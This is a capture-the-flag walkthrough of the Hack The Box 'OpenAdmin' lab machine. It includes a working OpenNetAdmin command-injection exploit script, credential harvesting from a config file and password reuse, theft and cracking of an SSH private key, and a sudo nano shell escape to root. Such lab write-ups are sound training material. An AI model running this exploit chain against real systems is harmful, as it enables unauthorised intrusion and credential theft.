# Hack The Box  - OpenAdmin 10.10.10.171

![87c64d8779ef284821ade32a84f4319d.png](_resources/e747b28228244e00821545e997ebe9ef.png)

OpenAdmin was an easy rated box from Hack The Box. It starts off by finding an instance of OpenNetAdmin which vulnerable to a Remote Code Execution. By leveraging the RCE, I can obtain a the database credentials that are reused by one of the user. I'll also find an internal website that stores the second user SSH key. Lastly, I'm using GTFObins to abuse sudo privileges on nano editor, it allows me to escalate to the root user.

# Reconnaissance
I'll start with port scanning using `nmap`

## Nmap
```
nmap -sV -sC -oA OpenAdmin 10.10.10.171
```

- -sC, to scan with default script
- -sV, to scan service version
- -oN, to save the output to .nmap file
- -V, to verbose during the scan.

```text
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

From the scan above, there are two ports open. Because SSH usually requires a valid credentials, I'll explore the apache service on port 80.


## TCP  80 - Website

It only display the default Apache page.

![1ad0727e5956f0800cbe4ec0c02df451.png](_resources/4fb96d89a99c4244bb54291abd974267.png)

By using `dirb` I discovered few hidden path.
```text
dirb http://openadmin.htb/ /usr/share/wordlists/dirb/common.txt -r
... <omitted> 
---- Scanning URL: http://openadmin.htb/ ----
==> DIRECTORY: http://openadmin.htb/artwork/
+ http://openadmin.htb/index.html(CODE:200|SIZE:10918) 
==> DIRECTORY: http:/openadmin.htb/music/
+ http://openadmin.htb/server-status (CODE:200|SIZE:278)
... <omitted> 
```

The newly discovered path are just dummy web except the one in `/music` which I found a login menu that links to `http://openadmin.htb/ona`

![f0df4d83acc69be1e666eb6e40a73494.png](_resources/88b4ba1460574b0f88a4acd81e00d392.png)
*Ok, from music page to networking, doesn't make any sense to me*

I think `/ona` is an abbreviation for OpenNetAdmin. It's a system to manage things related to IP address and somehow I'm already logged in using guest account. 

The page shows a warning that it is not running the latest version compared to current version v18.1.1 that is being used.

## Initial Access

### Shell as www-data

I discovered that this version of OpenNetAdmin is vulnerable to RCE. It also has the exploit poc made by mattpascoe 

https://www.exploit-db.com/exploits/47691

OpenRCE.sh
```
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

The exploit only needs the instance url of OpenNetAdmin
```
./OpenRCE.sh http://openadmin.htb/ona/
```

![db477cc560e79f4bf705987c3188ee25.png](_resources/2371e9e41f8449479f1bd8f24e8af888.png)


I can enumerate all files in the current directory that www-data has access to.

```
find ./ -type f -user www-data
```

Inside `/local/config/database_settings.inc.php`, I found a stored password.

cat /opt/ona/www/local/config/database_settings.inc.php

```
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

I'll spray the password to the current available in `/home` directory

```
$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

# Privilege Escalation

## Shell as jimmy

The password is reused by jimmy

![a0518e175f0d68951eac7bbb348b24e0.png](_resources/25ec2fca7eb84dad9f748aeb299ef35b.png)

But no `user.txt` in jimmy's home dir. 

## Shell as joanna

For the second time, I use the find command to search all files accessible/owned by jimmy.

```
find / -type f -user jimmy 2>/dev/null
```

It turns out that user jimmy has access to all files in `/var/www/internal/` and based on the apache2 config, the site is running locally on port 52846.

```
$ cat /etc/apache2/sites-enabled/internal.conf 
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

I went to `/var/www/internal/` to read the web source code and I found an interesting line code in `main.php`.

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

This line code has an improper redirection. 
```
<?php session_start(); 
	if (!isset ($_SESSION['username'])) { 
		header("Location: /index.php"); 
	};
``` 

It checks for a user session but after the header location is set to `/index.php`, it doesn't have a `die()` or `exit()` function called. This will resulting the rest of the code get executed/rendered.
```
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
```

Hence, I could just use `curl` without `-L` option to prevent the page redirection and read the joana's SSH key.

![6b73c3ba7aa0ba3e068b85435dc8aeb1.png](_resources/ea391edd6c66409d8bb551eecdac08d5.png)

Because the private key is encrypted with a password, I'll convert it to hash using `ssh2john` and crack it on my Windows machine.

```
python ssh2john.py joanna_rsa > joanna_rsa.hash
```

The password got cracked in 17 sec
![ca148e3ae5b2e8b65406e0d387ca1771.png](_resources/fa7463b8239345409a2250597b3dfa69.png)


Successfully logged in as joanna.
```
ssh -i joanna_rsa joanna@10.10.10.171
```

![8f710060b1059b0ddb7cae2253e0c1ac.png](_resources/673cb008921d4eba886820c17fef43a0.png)

User flag is done here.

## Shell as root

Escalation to root from joanna is straight forward. User joanna has sudo privileges on `/bin/nano`

```
$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

By running nano with
```
sudo /bin/nano /opt/priv
```

and then hit CTRL + R, I could just enter the `/root/root.txt` to obtain the root flag.

And using GTFOBins as reference, below is the way to spawn a shell

```
sudo /bin/nano /opt/priv
^R^X
reset; sh 1>&0 2>&0
```

*^R mean CTRL+R*  
*^X mean CTRL+X*